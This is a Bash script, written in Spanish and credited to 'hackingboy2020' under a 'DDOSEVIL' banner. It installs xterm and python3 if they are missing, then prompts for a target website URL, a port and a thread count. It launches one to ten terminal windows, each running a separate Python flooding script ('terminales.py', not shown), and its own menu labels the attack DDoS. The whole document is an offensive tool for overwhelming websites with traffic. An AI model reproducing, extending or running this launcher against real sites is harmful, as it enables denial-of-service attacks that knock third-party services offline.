
# Si vas a copiarme el script dame creditos porfa jiji


blanco="\033[1;37m"
gris="\033[0;37m"
morado1="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
morado2="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fuksia="\033[0;35m"
azulito="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"

echo -e "$morado2        ▓█████▄ ▓█████▄  ▒█████    ██████ ▓█████ ██▒   █▓ ██▓ ██▓        "
echo -e "$morado2        ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓█   ▀▓██░   █▒▓██▒▓██▒        "
echo -e "$morado2        ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ▒███   ▓██  █▒░▒██▒▒██░         "
echo -e "$morado2        ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒▒▓█  ▄  ▒██ █░░░██░▒██░         "
echo -e "$morado2        ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒░▒████▒  ▒▀█░  ░██░░██████▒   "
echo -e "$morado2        ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░       "
echo -e "$morado2        ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░         "
echo -e "$morado2        ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░       ░░   ▒ ░  ░ ░              "
echo -e "$morado2          ░       ░        ░ ░        ░     ░  ░     ░   ░      ░  ░            "
echo -e "$morado2          ░       ░                                   ░                           "

echo -e "$rojo                       Creado por hackingboy2020 ;)                             "





# Xterm y python3
                                                                                
if xterm -version &>/dev/null; then
    echo -e "$amarillo Xterm esta instalado  $nc"
else
echo -e "\e[94mInstalando Xterm...\e[0m"
progressbar()
{
    bar="------------------------------------------"
    barlength=${#bar}
    n=$(($1*barlength/100))
    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
}


pid=$!

apt-get install xterm > /dev/null

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done 

kill $pid > /dev/null 2>&1
echo $'\n*\n*\n\e[97mSe ha instalado correctamente xterm\e[0m'
fi  
if command -v python3 &>/dev/null; then
    echo -e "$amarillo Python 3 esta instalado $nc"
else

echo -e "\e[94mSe esta instalando python3....\e[0m"
progressbar()
{
    bar="----------------------------------------"
    barlength=${#bar}
    n=$(($1*barlength/100))
    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
}


pid=$!

apt-get install python3 > /dev/null

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done  

kill $pid > /dev/null 2>&1 
echo $'\n*\n*\n\e[97mSe ha instalado correctamente python3 en tu sistema operativo ;)\e[0m'
fi
read -p $'\033[0;37mEscribe la url de la pagina\e[0m     = ' web
read -p $'\033[0;37mPon el puerto a atacar  \e[0m      = ' port
read -p $'\033[0;37mEscribe los hilos[120]\e[0m = ' thread

echo "------------------------------------------------------------------"
echo -e "$amarillo Elije:                                               -   "
echo "------------------------------------------------------------------"
echo -e "-$azulito (1) = Una terminal DdoS                                -              "
echo -e "-$azulito (2) = Dos terminales DdoS                              -              " 
echo -e "-$azulito (3) = Tres terminales DdoS                             -              "
echo -e "-$azulito (4) = Cuatro terminales DdoS                           -              "
echo -e "-$azulito (5) = Cinco terminales DdoS                            -              "
echo -e "-$azulito (6) = Seis terminales DdoS                             -              "
echo -e "-$azulito (7) = Siete terminales DdoS                            -              "
echo -e "-$azulito (8) = Ocho terminales DdoS                             -              "
echo -e "-$azulito (9) = Nueve terminales DdoS                            -              "
echo -e "-$azulito (10) = Diez terminales DdoS                            -              "
echo "------------------------------------------------------------------"
echo -e "---------------------------"
read -p " ESCRIBE LAS TERMINALES QUE QUIERAS DEL 1-10  = " SA



if [ $SA = 1 ]; then
xterm -e python3 terminales.py -s $web -p $port -t $thread &
fi

if [ $SA = 2 ]; then
for i in {1..2}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done


fi
if [ $SA = 3 ]; then
for i in {1..3}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 4 ]; then
for i in {1..4}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi
if [ $SA = 5 ]; then
for i in {1..5}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi
if [ $SA = 6 ]; then
for i in {1..6}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 7 ]; then
for i in {1..7}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 8 ]; then
for i in {1..8}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 9 ]; then
for i in {1..9}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 10 ]; then
for i in {1..10}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi
echo "$rojo HERRAMIENTA CERRADA $nc"




